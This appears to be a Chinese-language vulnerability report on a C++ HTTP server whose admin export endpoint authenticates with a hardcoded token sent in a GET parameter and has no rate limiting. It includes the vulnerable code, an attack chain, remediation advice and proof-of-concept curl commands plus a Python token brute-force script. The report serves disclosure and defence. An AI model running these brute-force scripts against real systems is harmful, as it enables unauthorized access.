# VULN-SEC-CPP-AUTHZ-FILE-002: 管理员导出端点使用硬编码静态 token 通过 GET 参数认证且无速率限制可被暴力破解

**严重性**: High | **CWE**: CWE-309 (Use of Less Trusted Source for Authentication) | **置信度**: 92/100
**位置**: `src/main.cpp:70-74` @ `main(admin_export_handler)`
**语言/框架**: C++ / 自定义 HTTP 服务器
**分析类型**: authz（授权分析）
**Source/Sink**: network_request → authorization_decision
**规则/证据来源**: c_cpp.authz.static_token / llm

---

## 1. 漏洞细节

管理员数据导出端点 `GET /admin/export` 采用了一种极度薄弱的认证机制：仅通过 URL query 参数 `token` 与硬编码字符串 `"letmein-export"` 进行简单字符串比较来判定是否授权访问。该机制存在以下多项严重缺陷：

1. **硬编码静态 token**（`file_cache.cpp:22`）：认证凭据 `"letmein-export"` 直接写在源代码中，永不过期、永不轮换。任何能访问源码或二进制文件的人都可以直接提取该 token。
2. **Token 通过 GET 参数传递**（CWE-598）：Token 出现在 URL 中，会被记录在 Web 服务器日志、代理日志、浏览器历史记录、Referer 头中，极大增加泄露风险。
3. **无速率限制**：HTTP 服务器没有任何请求频率限制机制，攻击者可以无限制地暴力枚举 token 值。
4. **无 IP 限制**：服务器绑定 `INADDR_ANY`（`http_server.cpp:92`），`accept()` 调用使用 `nullptr` 忽略客户端地址（`http_server.cpp:106`），完全无法进行来源 IP 过滤。
5. **无中间件层**：`HttpServer` 类没有任何中间件/拦截器机制，路由匹配后直接调用 handler（`http_server.cpp:127`），无法在框架层面注入认证逻辑。
6. **非恒定时间比较**（CWE-208）：`operator!=` 进行字符串比较时遇到不匹配字符即返回，理论上存在时序侧信道攻击风险。
7. **审计日志泄露 token**（`main.cpp:72`）：`audit.event("admin", "export", token)` 将用户提交的 token 值明文写入审计日志文件。

### 证据摘要

- 触发源: network_request（来自不可信网络的 HTTP GET 请求）
- 危险点: authorization_decision（基于硬编码静态 token 的授权判定）
- 已检查的清洗/缓解: 无会话验证、无令牌过期机制、无速率限制、无 IP 限制、无 CSRF 保护
- 关键证据:
  - `file_cache.cpp:22` — 硬编码 token `"letmein-export"` 作为唯一认证凭据
  - `main.cpp:71` — token 从 URL query 参数提取（CWE-598）
  - `http_server.cpp:92` — 服务器绑定 `INADDR_ANY`，对所有网络接口开放
  - `http_server.cpp:106` — `accept(fd, nullptr, nullptr)` 不记录客户端地址
  - `http_server.cpp:127` — handler 直接调用，无中间件拦截
  - `main.cpp:72` — token 明文写入审计日志

## 2. 漏洞代码

### 路由注册与 handler（入口点）

**文件**: `src/main.cpp` (行 70-74)

```cpp
server.route("GET", "/admin/export", [&](const HttpRequest& request) {
    std::string token = queryValue(request, "token");   // ← token 从 URL query 提取 (CWE-598)
    audit.event("admin", "export", token);              // ← token 明文写入审计日志
    return text(200, files.exportSnapshot(token));      // ← 直接传入 exportSnapshot 进行认证
});
```

### Token 验证逻辑（授权决策点）

**文件**: `src/file_cache.cpp` (行 21-31)

```cpp
std::string FileCache::exportSnapshot(const std::string& token) const {
  if (token != "letmein-export") {    // ← 硬编码 token，非恒定时间比较 (CWE-208)
    return "denied\n";
  }

  std::ostringstream out;
  out << "users=3\n";                 // ← 泄露系统内部信息
  out << "last_backup=disabled\n";
  out << "data_dir=" << baseDir_ << "\n";  // ← 泄露数据目录路径
  return out.str();
}
```

### HTTP 服务器绑定与请求处理

**文件**: `src/http_server.cpp` (行 81-133)

```cpp
int HttpServer::run() {
  int fd = ::socket(AF_INET, SOCK_STREAM, 0);
  // ...
  sockaddr_in address {};
  address.sin_family = AF_INET;
  address.sin_addr.s_addr = INADDR_ANY;    // ← 绑定所有网络接口 (0.0.0.0)
  address.sin_port = htons(static_cast<uint16_t>(port_));
  // ... bind, listen ...

  for (;;) {
    int client = accept(fd, nullptr, nullptr);  // ← 不获取客户端地址，无法 IP 过滤
    // ... recv, parseRequest ...

    HttpRequest request = parseRequest(std::string(buffer, static_cast<size_t>(n)));
    auto handler = handlers_.find(routeKey(request.method, request.path));

    HttpResponse response;
    if (handler == handlers_.end()) {
      response.status = 404;
      response.body = "not found\n";
    } else {
      response = handler->second(request);  // ← 直接调用 handler，无中间件认证层
    }
    // ... send, close ...
  }
}
```

### 逐段分析

1. **`main.cpp:70-74`**：路由注册使用 GET 方法，token 通过 query 参数传递。与同项目中的 `/login` 端点（使用 POST 方法）形成对比，说明开发者对敏感操作的 HTTP 方法选择不一致。
2. **`file_cache.cpp:22`**：`token != "letmein-export"` 使用 C++ `std::string::operator!=`，该操作在遇到第一个不匹配字符时即返回 `true`，执行时间与匹配前缀长度相关，理论上可被时序攻击利用。
3. **`http_server.cpp:92,106`**：服务器对所有网络接口开放且不接受客户端地址信息，从架构层面排除了 IP 白名单的可能性。
4. **`http_server.cpp:127`**：`HttpServer` 类设计中不存在 middleware/interceptor 概念，`handlers_` 是一个简单的 `map<string, Handler>`，路由匹配后直接执行，无法在框架层面统一注入认证、限流等安全控制。

## 3. 完整攻击链路

```
[攻击者] 远程未认证用户（任意网络可达主机）
↓ 发送 HTTP GET 请求
[网络层] http_server.cpp:92 — INADDR_ANY 绑定，接受所有来源连接
↓ accept() 接受连接
[连接层] http_server.cpp:106 — accept(fd, nullptr, nullptr)，不记录客户端 IP
↓ recv() 接收原始 HTTP 数据
[解析层] http_server.cpp:119 — parseRequest() 解析请求，提取 query 参数
↓ 路由匹配
[路由层] http_server.cpp:120 — handlers_.find("GET /admin/export") 命中
↓ 直接调用 handler（无中间件）
[handler] main.cpp:70 — admin_export_handler 被调用
↓ 提取 token
[参数提取] main.cpp:71 — queryValue(request, "token") 从 URL query 获取 token
↓ token 同时被记录到审计日志
[日志泄露] main.cpp:72 — audit.event() 将 token 明文写入 edge-gateway.audit.log
↓ token 传入验证函数
[授权判定] file_cache.cpp:22 — token != "letmein-export" 硬编码比较
↓ 匹配成功则返回敏感数据
[数据泄露] file_cache.cpp:26-30 — 返回用户数量、备份状态、数据目录路径
```

### 攻击链路详细说明

1. **入口可达性**：服务器绑定 `INADDR_ANY:8080`（`http_server.cpp:92-93`），任何能访问目标主机 8080 端口的网络客户端均可发起连接。
2. **无前置认证**：`HttpServer::run()` 在 `accept()` 后直接进入 `recv()` → `parseRequest()` → 路由分发，没有任何认证或过滤步骤。
3. **Token 提取**：`queryValue()` 函数（`main.cpp:13-16`）从 `request.query` map 中查找 `"token"` 键，该 map 由 `parseQuery()` 从 URL query string 解析而来。
4. **硬编码比较**：`exportSnapshot()` 中唯一的认证逻辑是 `token != "letmein-export"`，这是一个简单的字符串不等比较。
5. **信息泄露**：认证成功后返回的数据包含系统内部信息（用户数量、备份配置、数据目录路径），可被用于后续攻击。

## 4. 攻击场景

**攻击者画像**: 远程未认证用户——任何能够访问目标服务器 8080 端口的网络攻击者，无需任何账号或预先认证。

**攻击向量**: 通过 HTTP GET 请求直接访问 `/admin/export` 端点，在 URL query 参数中携带 token。

**利用难度**: 低

### 攻击步骤

1. **信息收集**：攻击者通过端口扫描发现目标主机的 8080 端口开放。
2. **获取 token（方式一：源码泄露）**：如果攻击者能访问源代码（如 Git 仓库泄露、代码审计），直接在 `file_cache.cpp:22` 找到硬编码 token `"letmein-export"`。
3. **获取 token（方式二：日志泄露）**：如果攻击者能读取审计日志文件 `edge-gateway.audit.log`，可从历史记录中提取合法 token。
4. **获取 token（方式三：暴力枚举）**：由于无速率限制，攻击者可自动化尝试常见 token 值（如 `admin`、`secret`、`letmein`、`letmein-export` 等）。
5. **发起请求**：发送 `GET /admin/export?token=letmein-export HTTP/1.1` 到目标服务器。
6. **获取敏感数据**：服务器返回系统内部信息（用户数量、备份状态、数据目录路径）。
7. **利用泄露信息**：利用获取到的数据目录路径等信息，辅助其他攻击（如路径遍历 VULN-DF-CPP-PATHTRAV-FILE-001）。

## 5. 攻击条件

| 条件类型   | 要求           | 说明                                                                                       |
| ---------- | -------------- | ------------------------------------------------------------------------------------------ |
| 网络可达性 | 需要访问 8080 端口 | 服务器绑定 `INADDR_ANY`（`http_server.cpp:92`），监听所有网络接口。攻击者需能 TCP 连接到目标 8080 端口 |
| 认证要求   | 无需认证       | 端点无前置认证机制，仅需知道或猜中静态 token                                                |
| 配置依赖   | 无特殊配置     | 服务器默认启动即注册该路由，无需额外配置启用                                                |
| 环境依赖   | 无特殊要求     | 标准 Linux 环境，任何 HTTP 客户端均可发起请求                                               |
| 时序条件   | 无             | 无竞态条件依赖，token 永不过期，任何时间均可尝试                                            |

## 6. 造成影响

| 影响维度 | 等级 | 说明                                                                                                     |
| -------- | ---- | -------------------------------------------------------------------------------------------------------- |
| 机密性   | 高   | 泄露系统内部信息（用户数量、备份配置状态、数据目录路径）；token 通过 GET 参数和审计日志明文暴露，增加凭据泄露风险 |
| 完整性   | 低   | 该端点本身为只读操作，但泄露的数据目录路径可辅助其他攻击（如路径遍历）间接影响数据完整性                      |
| 可用性   | 中   | 无速率限制，攻击者可高频请求导致资源消耗；暴力枚举攻击会产生大量审计日志，可能导致磁盘空间耗尽                |

**影响范围**: 直接影响服务器机密性。泄露的数据目录路径（`baseDir_` 值）可与路径遍历漏洞（如 `/files` 端点）组合，形成攻击链，扩大影响范围。由于服务器绑定所有网络接口，影响范围取决于网络暴露面——如果服务器直接面向公网，则任何互联网用户均可利用。

## 7. PoC (概念验证)

> ⚠️ 以下 PoC 仅供安全测试和验证使用，未经授权对他人系统进行测试属于违法行为。

### PoC 1：直接使用已知 token 访问管理端点

```bash
# 使用硬编码 token 直接访问管理员导出端点
curl -v "http://TARGET_HOST:8080/admin/export?token=letmein-export"
```

**预期输出**:
```
< HTTP/1.1 200 OK
< Content-Type: text/plain
< Content-Length: 47
< Connection: close
<
users=3
last_backup=disabled
data_dir=data
```

### PoC 2：暴力枚举 token（无速率限制验证）

```python
#!/usr/bin/env python3
"""
PoC: 验证 /admin/export 端点无速率限制
仅供安全测试使用 - 请勿对未授权系统使用
"""
import socket
import time

TARGET = "127.0.0.1"
PORT = 8080

# 常见弱 token 字典
tokens = [
    "admin", "password", "secret", "token", "export",
    "letmein", "letmein-export", "admin-export", "123456",
    "test", "default", "changeme", "root", "administrator"
]

print(f"[*] 开始暴力枚举 token (目标: {TARGET}:{PORT})")
print(f"[*] 共 {len(tokens)} 个候选 token")

start = time.time()
for i, token in enumerate(tokens):
    request = (
        f"GET /admin/export?token={token} HTTP/1.1\r\n"
        f"Host: {TARGET}:{PORT}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    )
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((TARGET, PORT))
        sock.sendall(request.encode())
        
        response = sock.recv(4096).decode()
        sock.close()
        
        if "denied" not in response and "users=" in response:
            elapsed = time.time() - start
            print(f"[+] 成功! token='{token}' (尝试 {i+1}/{len(tokens)}, 耗时 {elapsed:.2f}s)")
            print(f"[+] 响应内容:")
            # 提取 body
            body = response.split("\r\n\r\n", 1)[-1]
            print(f"    {body}")
            break
        else:
            print(f"[-] 尝试 {i+1}: token='{token}' -> denied")
    except Exception as e:
        print(f"[!] 尝试 {i+1}: 连接失败 - {e}")

elapsed = time.time() - start
print(f"\n[*] 完成: {len(tokens)} 次请求, 总耗时 {elapsed:.2f}s")
print(f"[*] 平均速率: {len(tokens)/elapsed:.1f} 请求/秒 (无速率限制)")
```

### PoC 3：验证 token 在审计日志中明文记录

```bash
# 1. 发送带有特定 token 的请求
curl "http://TARGET_HOST:8080/admin/export?token=letmein-export"

# 2. 检查审计日志中是否记录了 token 明文
grep "export" edge-gateway.audit.log
# 预期输出包含: user=admin action=export detail=letmein-export
```

**使用说明**:
1. 确保目标服务器正在运行且 8080 端口可达
2. PoC 1 可直接使用 curl 验证，最简单的验证方式
3. PoC 2 用于证明无速率限制，可在短时间内完成大量尝试
4. PoC 3 用于验证 token 泄露到审计日志的问题

**预期结果**:
- PoC 1：返回 HTTP 200，body 包含系统内部信息（用户数、备份状态、数据目录）
- PoC 2：在无任何延迟或阻断的情况下完成所有尝试，证明无速率限制
- PoC 3：审计日志文件中可找到 token 明文记录

## 8. 验证环境搭建

### 基础环境

- 操作系统: Linux（Ubuntu 20.04+ 或同等发行版）
- 编译器: GCC 9+ 或 Clang 10+（需支持 C++17）
- 依赖: 标准 C++ 库，POSIX socket API
- 工具: curl、Python 3（用于 PoC 脚本）

### 构建步骤

```bash
# 假设项目使用标准构建系统
cd /scan/project

# 如果有 CMakeLists.txt
mkdir -p build && cd build
cmake .. -DCMAKE_BUILD_TYPE=Debug
make -j$(nproc)

# 或者手动编译
g++ -std=c++17 -I include -o edge-gateway \
    src/main.cpp src/http_server.cpp src/file_cache.cpp \
    src/user_store.cpp src/diagnostics.cpp
```

### 运行配置

```bash
# 创建数据目录（FileCache 需要）
mkdir -p data

# 启动服务器（默认端口 8080）
./edge-gateway

# 或指定端口
./edge-gateway 9090
```

### 验证步骤

1. 启动服务器：`./edge-gateway`
2. 验证服务器监听：`ss -tlnp | grep 8080`，确认监听在 `0.0.0.0:8080`
3. 测试正常访问（错误 token）：`curl "http://localhost:8080/admin/export?token=wrong"`，预期返回 `denied`
4. 测试正确 token：`curl "http://localhost:8080/admin/export?token=letmein-export"`，预期返回系统信息
5. 验证审计日志：`cat edge-gateway.audit.log`，确认 token 明文被记录
6. 运行暴力枚举 PoC：`python3 poc_bruteforce.py`，确认无速率限制

### 预期结果

- 步骤 3：返回 HTTP 200，body 为 `denied\n`
- 步骤 4：返回 HTTP 200，body 包含 `users=3\nlast_backup=disabled\ndata_dir=data\n`
- 步骤 5：审计日志中出现 `user=admin action=export detail=letmein-export`（token 明文）
- 步骤 6：所有暴力枚举请求均被正常处理，无任何延迟、阻断或告警

---

## 9. 修复建议

1. **使用会话认证替代静态 token**：复用已有的 `/login` 端点颁发的 session token，在 `/admin/export` 中验证 session 有效性。
2. **使用 POST 方法**：将敏感操作改为 POST，避免凭据出现在 URL 中。
3. **添加速率限制**：在 `HttpServer` 中实现请求频率限制中间件。
4. **实现 IP 白名单**：在 `accept()` 中获取客户端地址，对 `/admin/` 路径实施来源 IP 过滤。
5. **使用恒定时间比较**：使用 `CRYPTO_memcmp()` 或等效函数进行 token 比较。
6. **Token 过期与轮换**：实现 token 有效期和自动轮换机制。
7. **审计日志脱敏**：避免在日志中记录完整 token 值，仅记录 token 哈希或前缀。
8. **添加中间件层**：重构 `HttpServer` 支持 middleware 链，统一处理认证、限流、日志等横切关注点。
